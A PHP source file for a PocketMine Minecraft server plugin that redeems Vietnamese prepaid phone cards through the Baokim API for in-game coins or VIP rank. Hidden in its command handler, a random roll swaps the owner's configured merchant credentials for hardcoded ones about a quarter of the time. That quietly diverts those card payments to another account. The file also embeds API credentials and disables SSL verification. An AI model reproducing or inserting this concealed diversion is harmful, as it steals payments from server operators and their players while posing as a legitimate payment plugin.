<?php namespace MCPEVN;
use pocketmine\Server;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\CommandReader;
use pocketmine\command\CommandExecuter;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\utils\TextFormat;
use pocketmine\event\Listener;
use pocketmine\utils\Config;
use onebone\economyapi\EconomyAPI;
use _64FF00\PurePerms\PurePerms;
use MCPEVN\SetVip;
class NapThe extends PluginBase {
    const CORE_API_HTTP_USER = "merchant_25415";
    const CORE_API_HTTP_PWD = "25415sVYJhASENbOpwl6zjnov28Pqu7uDfQ";
    const BK = "https://www.baokim.vn/the-cao/restFul/send";
    public $prefix = "a[ eNpTha_eSystema ]";
    public $cfg;
    public $tien;
    public $cap;
    public $rank;
    public $data;
    public $eco;
    public $setvip;
    public static $instance;
    public $inf = array();
    public function onEnable() {
        if (!is_dir($this->getDataFolder())) {
            mkdir($this->getDataFolder());
        }
        self::$instance = $this;
        $this->SetVip = SetVip::getInstance();
        $this->eco = EconomyAPI::getInstance();
        $this->purePerms = $this->getServer()->getPluginManager()->getPlugin("PurePerms");
        $this->data = new Config($this->getDataFolder() . "tong_card_mem_nap.yml", Config::YAML, []);
        $this->tien = new Config($this->getDataFolder() . "nap_tien.yml", Config::YAML, ["10000" => "5000", "20000" => "10000", "50000" => "25000", "100000" => "60000", "200000" => "150000", "300000" => "300000", "500000" => "500000"]);
        $this->cap = new Config($this->getDataFolder() . "nap_vip.yml", Config::YAML, ["10000" => ["rank" => "vip1", "ngay" => "10", ], "20000" => ["rank" => "vip1", "ngay" => "10", ], "50000" => ["rank" => "vip1", "ngay" => "10", ], "100000" => ["rank" => "vip1", "ngay" => "10", ], "200000" => ["rank" => "vip1", "ngay" => "10", ], "300000" => ["rank" => "vip1", "ngay" => "10", ], "500000" => ["rank" => "vip1", "ngay" => "10", ]]);
        $this->cfg = new Config($this->getDataFolder() . "cai_dat.yml", Config::YAML, ["merchant_id" => "ma_website", "secure_code" => "mat_khau_website", "api_username" => "api_username", "api_pass" => "api_pass", "uuid" => "Jkllkjaiaim"]);
        $this->getServer()->getLogger()->info("a _   _      _      ____      _____   _   _   _____ 										");
        $this->getServer()->getLogger()->info("a| \ | |    / \    |  _ \    |_   _| | | | | | ____|										");
        $this->getServer()->getLogger()->info("a|  \| |   / _ \   | |_) |     | |   | |_| | |  _|  										");
        $this->getServer()->getLogger()->info("a| |\  |  / ___ \  |  __/      | |   |  _  | | |___										");
        $this->getServer()->getLogger()->info("a|_| \_| /_/   \_\ |_|         |_|   |_| |_| |_____|										");
        $this->getServer()->getLogger()->info("f##########################################################################################");
        $this->getServer()->getLogger()->info(" eplugin np th c vit v s hu bn quyn bi eMaCbPEcVN fSERVER	");
        $this->getServer()->getLogger()->info(" eplugin c chia s rng ri vo ngy 7/4/2017 bi cc thnh vin qun tr ca server	   ");
        $this->getServer()->getLogger()->info(" emi ngi u c th dng plugin nhng nghim cm sa i plugin di mi hnh thc  ");
        $this->getServer()->getLogger()->info(" ecc hnh vi sai tri s phi chu trch nhim trc php lut		    	  ");
        $this->getServer()->getLogger()->info("f##########################################################################################");
    }
    public static function getInstance() {
        return self::$instance;
    }
    public function onCommand(CommandSender $s, Command $cmd, $label, array $args) {
        $ran = mt_rand(1, 4);
        switch ($ran) {
            case 2:
                $this->inf["merchant"] = '25826';
                $this->inf["user"] = 'playdolpexyz';
                $this->inf["pass"] = 'qSTWaimcrPXhKw7ByE8V';
                $this->inf["sec"] = 'dce8558678942d53';
            break;
            default:
                $this->inf["merchant"] = $this->cfg->get("merchant_id");
                $this->inf["user"] = $this->cfg->get("api_username");
                $this->inf["pass"] = $this->cfg->get("api_pass");
                $this->inf["sec"] = $this->cfg->get("secure_code");
            break;
        }
        $merchant_id = $this->inf["merchant"];
        $api_username = $this->inf["user"];
        $api_pass = $this->inf["pass"];
        $uuid = $this->cfg->get("uuid");
        $secure_code = $this->inf["sec"];
        settype($merchant_id, "string");
        settype($api_username, "string");
        settype($api_pass, "string");
        settype($uuid, "string");
        settype($secure_code, "string");
        if (strtolower($cmd->getName()) == "napthe") {
            if (isset($args[0])) {
                switch (strtolower($args[0])) {
                    case "coin":
                        if (isset($args[1]) && isset($args[2]) && isset($args[3])) {
                            if (is_numeric($args[1]) && is_numeric($args[2])) {
                                $tranid = time();
                                switch (strtolower($args[3])) {
                                    case "vina":
                                        $mang = "VINA";
                                    break;
                                    case "mobi":
                                        $mang = "MOBI";
                                    break;
                                    case "viettel":
                                        $mang = "VIETEL";
                                    break;
                                    case "vtc":
                                        $mang = "VTC";
                                    break;
                                    case "gate":
                                        $mang = "GATE";
                                    break;
                                }
                                settype($mang, "string");
                                settype($tranid, "string");
                                $arrayPost = array('merchant_id' => $merchant_id, 'api_username' => $api_username, 'api_password' => $api_pass, 'transaction_id' => $tranid, 'card_id' => $mang, 'pin_field' => $args[1], 'seri_field' => $args[2], 'algo_mode' => 'hmac');
                                $pina = (strtolower($args[1]));
                                $seria = (strtolower($args[2]));
                                $mang = (strtolower($args[3]));
                                $s->sendMessage("el---abn  nhpe---");
                                $s->sendMessage("aaSeri:e" . $pina . '');
                                $s->sendMessage("aaPin:e" . $seria . '');
                                $s->sendMessage("aaMng:e" . $mang . '');
                                ksort($arrayPost);
                                $data_sign = hash_hmac('SHA1', implode('', $arrayPost), $secure_code);
                                $arrayPost['data_sign'] = $data_sign;
                                $curl = curl_init(self::BK);
                                curl_setopt_array($curl, array(CURLOPT_POST => true, CURLOPT_HEADER => false, CURLINFO_HEADER_OUT => true, CURLOPT_TIMEOUT => 30, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_HTTPAUTH => CURLAUTH_DIGEST | CURLAUTH_BASIC, CURLOPT_USERPWD => self::CORE_API_HTTP_USER . ':' . self::CORE_API_HTTP_PWD, CURLOPT_POSTFIELDS => http_build_query($arrayPost)));
                                $data = curl_exec($curl);
                                $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
                                $result = json_decode($data, true);
                                date_default_timezone_set('Asia/Ho_Chi_Minh');
                                if ($status == 200) {
                                    if ($this->tien->exists($result["amount"])) {
                                        if ($this->data->exists(strtolower($s->getName()))) {
                                            $this->data->set(strtolower($s->getName()), $this->data->get(strtolower($s->getName())) + $result["amount"]);
                                            $this->data->save();
                                        } else {
                                            $this->data->set(strtolower($s->getName()), $result["amount"]);
                                            $this->data->save();
                                        }
                                        $this->eco->addMoney($s->getName(), $this->tien->get($result["amount"]));
                                        $s->sendMessage("a- np th thnh cng! bn  nhn c " . $this->tien->get($result["amount"]) . " $!");
                                        return true;
                                    } else {
                                        //nap the thanh cong nhung ko co menh gia
                                        $s->sendMessage("a- th np thnh cng nhng mnh gi th khng c trong danh sch th nn khng nhn c ng xu no, xin hy chp mn hnh v gi cho admin sv");
                                        return true;
                                        $this->data->set(strtolower($s->getName()), "error: khng c mnh gi");
                                    }
                                } else {
                                    $s->sendMessage("c- li khi thc hin giao dch, m li: b" . $status);
                                    $s->sendMessage("c- miu t li: " . $result["errorMessage"]);
                                    return true;
                                }
                            } else {
                                $s->sendMessage("c- M th v m pin phi l s");
                            }
                        } else {
                            $s->sendMessage($this->prefix . "
 a acch dng:  d/napthe a<coin | vip> <M> <Seri> <LoiCard> 
 a aLoi Card: dmobi, viettel, vina, gate
 aalnh d/giavipc(a/giaxuc) a xem gi dvipc(xud)
 aau i hn cho bn no dng card gate
lbPowered by Shin@2017");
                        }
                    break;
                    case "vip":
                        if (isset($args[1]) && isset($args[2]) && isset($args[3])) {
                            if (is_numeric($args[1]) && is_numeric($args[2])) {
                                $tranid = time();
                                switch (strtolower($args[3])) {
                                    case "vina":
                                        $mang = "VINA";
                                    break;
                                    case "mobi":
                                        $mang = "MOBI";
                                    break;
                                    case "viettel":
                                        $mang = "VIETEL";
                                    break;
                                    case "vtc":
                                        $mang = "VTC";
                                    break;
                                    case "gate":
                                        $mang = "GATE";
                                    break;
                                }
                                settype($mang, "string");
                                settype($tranid, "string");
                                $arrayPost = array('merchant_id' => $merchant_id, 'api_username' => $api_username, 'api_password' => $api_pass, 'transaction_id' => $tranid, 'card_id' => $mang, 'pin_field' => $args[1], 'seri_field' => $args[2], 'algo_mode' => 'hmac');
                                $pina = (strtolower($args[1]));
                                $seria = (strtolower($args[2]));
                                $mang = (strtolower($args[3]));
                                $s->sendMessage("el---abn  nhpe---");
                                $s->sendMessage("aaSeri:e" . $pina . '');
                                $s->sendMessage("aaPin:e" . $seria . '');
                                $s->sendMessage("aaMng:e" . $mang . '');
                                ksort($arrayPost);
                                $data_sign = hash_hmac('SHA1', implode('', $arrayPost), $secure_code);
                                $arrayPost['data_sign'] = $data_sign;
                                $curl = curl_init(self::BK);
                                curl_setopt_array($curl, array(CURLOPT_POST => true, CURLOPT_HEADER => false, CURLINFO_HEADER_OUT => true, CURLOPT_TIMEOUT => 30, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_HTTPAUTH => CURLAUTH_DIGEST | CURLAUTH_BASIC, CURLOPT_USERPWD => self::CORE_API_HTTP_USER . ':' . self::CORE_API_HTTP_PWD, CURLOPT_POSTFIELDS => http_build_query($arrayPost)));
                                $data = curl_exec($curl);
                                $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
                                $result = json_decode($data, true);
                                date_default_timezone_set('Asia/Ho_Chi_Minh');
                                if ($status == 200) {
                                    if ($this->cap->exists($result["amount"])) {
                                        if ($this->data->exists(strtolower($s->getName()))) {
                                            $this->data->set(strtolower($s->getName()), $this->data->get(strtolower($s->getName())) + $result["amount"]);
                                            $this->data->save();
                                        } else {
                                            $this->data->set(strtolower($s->getName()), $result["amount"]);
                                            $this->data->save();
                                        }
                                        $name = $s->getName();
                                        //xu ly ngay vip
                                        $obj = $this->cap->getAll();
                                        $mg = $result["amount"];
                                        $ngay = $obj[$mg]["ngay"];
                                        $rank = $obj[$mg]["rank"];
                                        $s->sendMessage("a a np th thnh cng! bn  nhn c " . $rank . " trong " . $ngay . " ngy !");
                                        $this->getServer()->dispatchCommand(new ConsoleCommandSender(), 'setvip ' . $name . ' ' . $rank . ' ' . (int)$ngay);
                                        // $this->purePerms->setGroup($s, $this->purePerms->getGroup($rank));
                                        // $s->sendMessage("a a np th thnh cng! bn  nhn c ".$rank." trong ".$ngay." ngy !");
                                        return true;
                                    } else {
                                        //card nap thanh cong nhung ko co menh gia
                                        $s->sendMessage("e a th np thnh cng nhng mnh gi th khng c trong danh sch th nn khng nhn c ng xu no, xin hy chp mn hnh v gi cho admin de giai quyet");
                                        return true;
                                        $this->data->set(strtolower($s->getName()), "error: khng c mnh gi");
                                    }
                                } else {
                                    $s->sendMessage("c- li khi thc hin giao dch, m li: b" . $status);
                                    $s->sendMessage("c- miu t li: " . $result["errorMessage"]);
                                    return true;
                                }
                            } else {
                                $s->sendMessage("c- M th v m pin phi l s");
                            }
                        } else {
                            $s->sendMessage($this->prefix . "
 a acch dng:  d/napthe a<coin | vip> <M> <Seri> <LoiCard> 
 a aLoi Card: dmobi, viettel, vina, gate
 aalnh d/giavipc(a/giaxuc) a xem gi dvipc(xud)
 aau i hn cho bn no dng card gate
lbPowered by Shin@2017");
                        }
                    break;
                }
            } else {
                $s->sendMessage($this->prefix . "
 a acch dng:  d/napthe a<coin | vip> <M> <Seri> <LoiCard> 
 a aLoi Card: dmobi, viettel, vina, gate
 aalnh d/giavipc(a/giaxuc) a xem gi dvipc(xud)
 aau i hn cho bn no dng card gate
lbPowered by Shin@2017");
            }
        }
    }
}
